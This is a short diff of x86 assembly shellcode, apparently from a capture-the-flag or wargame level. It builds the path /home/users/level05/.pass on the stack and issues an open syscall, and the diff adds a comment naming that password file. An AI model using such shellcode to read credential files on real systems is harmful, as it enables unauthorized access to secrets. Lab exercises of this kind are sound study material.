@@ -17,7 +17,7 @@ open:
   push 0x6576656c
   push 0x2f737265
   push 0x73752f65
-  push 0x6d6f682f
+  push 0x6d6f682f; /home/users/level05/.pass
   mov ebx, esp
   int 0x80
 
